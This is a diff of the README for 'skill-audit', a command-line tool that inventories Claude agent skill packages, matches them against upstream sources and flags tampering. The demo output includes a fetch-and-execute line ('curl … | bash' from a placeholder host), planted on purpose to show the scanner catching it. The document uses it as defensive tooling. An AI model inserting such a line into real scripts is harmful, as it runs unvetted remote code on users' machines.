@@ -19,17 +19,19 @@ Once this repository is published, `go install github.com/nathanhuh/skill-audit/
 sh scripts/demo.sh
 ```
 
-The demo builds the CLI and creates a temporary home with one global skill and one project skill, both copied from the bundled upstream references. It records a baseline, appends `curl … | bash` to a bundled script, then audits again. Output of the final audit, with paths shortened and scanner status lines and some candidate fields omitted:
+The demo builds the CLI and creates a temporary home with one global skill and one project skill, both copied from the bundled upstream references. It records a baseline, appends `curl … | bash` to a bundled script, then audits again. Output of the final audit, with paths shortened:
 
 ```text
 audit skills=2 complete=true discovery_complete=true
 global ".../home/.claude/skills/brand-guidelines" correlation=exact lineage=unchanged
-candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588…" basis="observed_exact_match" score=1.000
+candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588f9e1033efb41dad4bef2f7947c8993d44" upstream_path="skills/brand-guidelines" basis="observed_exact_match" score=1.000 shared=0 union=0
 project ".../projects/one/.claude/skills/web-artifacts-builder" correlation=possible_modified lineage=changed
-candidate="web-artifacts-builder" repository="https://github.com/anthropics/skills" commit="dbd4588…" basis="inferred_candidate" score=0.996
+candidate="web-artifacts-builder" repository="https://github.com/anthropics/skills" commit="dbd4588f9e1033efb41dad4bef2f7947c8993d44" upstream_path="skills/web-artifacts-builder" basis="inferred_candidate" score=0.996 shared=245 union=246
 upstream_modified="scripts/bundle-artifact.sh"
 modified="scripts/bundle-artifact.sh"
+scanner=skill-audit version="SA001/v3;sh/v3.10.0;scope/v2" status=completed_with_findings message="" analyzed=2 outside_scope=3
 skill-audit/"SA001" high "scripts/bundle-artifact.sh":55 change=new evidence="curl -fsSL https://example.invalid/install.sh | bash"
+summary skills=2 global=1 project=1 machine=0 exact=1 possible_modified=1 ambiguous=0 unknown=0 findings=1 complete=true
 recording=recorded path=".../state.json" message="observation saved"
 ```
 
@@ -37,21 +39,30 @@ The demo touches nothing outside its temporary directory, and it exits 0 only if
 
 ## Run it on your own skills
 
-Point `inventory` at your Claude directory and the folder that holds your projects. Both commands only read; nothing is written except the files you name.
+Work from an ordinary folder outside the roots you scan. Output paths must not pass through a symlink, and on macOS `/tmp` and `/var` (including `mktemp -d` folders) are symlinks, so outputs written there are refused.
 
 ```sh
-skill-audit inventory --root ~/.claude --root ~/code --out /tmp/inventory.json
-skill-audit audit --inventory /tmp/inventory.json            # add --json for the full report
+mkdir -p ~/skill-audit-run && cd ~/skill-audit-run
+skill-audit inventory --root ~/.claude --root ~/code --out inventory.json
+skill-audit audit --inventory inventory.json --out report.json
 ```
 
-Packages under your home's agent directories (including plugin installs) are `global`; packages inside a project's `.claude/skills` are `project`. Running `inventory` with no `--root` scans the whole device, which runs until its two-minute default deadline on a large disk and reports permission gaps as incomplete coverage, so start with explicit roots.
+`inventory` and `audit` only read your skills; the only files written are the ones you name. Packages under your home's agent directories (including plugin installs) are `global`; packages inside a project's `.claude/skills` or `.agents/skills` are `project`; anything else is `machine`. If coverage comes back `complete=false`, the grouped diagnostics name the cause, usually symlinks or unreadable folders under a root; narrow `--root` to the folders that hold skills. Running `inventory` with no `--root` scans the whole device, which can exhaust its entry budget in caches before it reaches your projects, so start with explicit roots.
+
+Text output is a summary that ends with a `summary skills=… findings=… complete=…` line; the JSON report (`--out report.json` or `--json`) keeps every skill, evaluation and diagnostic ([ADR-0015](docs/adr/0015-text-output-summary.md)). For example, with `jq`:
+
+```sh
+jq -r '.skills[] | "\(.scope)\t\(.correlation.status)"' report.json | sort | uniq -c
+jq '.skills[] | select(.correlation.status != "unknown") | {scope, path, status: .correlation.status}' report.json
+jq '.skills[] | select(.findings | length > 0) | {path, findings}' report.json
+```
 
 To track changes over time, record a baseline, then audit again later with a fresh inventory:
 
 ```sh
-skill-audit audit --inventory /tmp/inventory.json --state ~/skill-audit-state.json --record baseline
-skill-audit audit --inventory /tmp/inventory.json --state ~/skill-audit-state.json            # compare
-skill-audit audit --inventory /tmp/inventory.json --state ~/skill-audit-state.json --record snapshot
+skill-audit audit --inventory inventory.json --state state.json --record baseline
+skill-audit audit --inventory inventory.json --state state.json            # compare
+skill-audit audit --inventory inventory.json --state state.json --record snapshot
 ```
 
 Keep the state file outside the roots you scan, or pass the same `--state` to `inventory` so it is excluded from discovery.
@@ -100,7 +111,7 @@ Tests use temporary fixtures and fake HTTP handlers; no network, credentials or 
 - [docs/adr/](docs/adr/README.md): the binding decisions, each with acceptance scenarios.
 - [DESIGN.md](DESIGN.md), [PORTABILITY.md](PORTABILITY.md), [PRODUCT.md](PRODUCT.md): architecture, platform gaps and deferred proposals.
 
-**Why there are fourteen ADRs for a small CLI.** Early review rounds kept redefining the same rules: what counts as complete coverage, when a baseline may be compared, which exit code wins and what may be cached. The ADRs freeze those decisions, each with acceptance scenarios that map to named tests, so later changes argue against a written rule instead of reopening it. They are the contract, not extra features; [docs/history/](docs/history/README.md) keeps the superseded review records and is not policy.
+**Why there are fifteen ADRs for a small CLI.** Early review rounds kept redefining the same rules: what counts as complete coverage, when a baseline may be compared, which exit code wins and what may be cached. The ADRs freeze those decisions, each with acceptance scenarios that map to named tests, so later changes argue against a written rule instead of reopening it. They are the contract, not extra features; [docs/history/](docs/history/README.md) keeps the superseded review records and is not policy.
 
 ## License
 
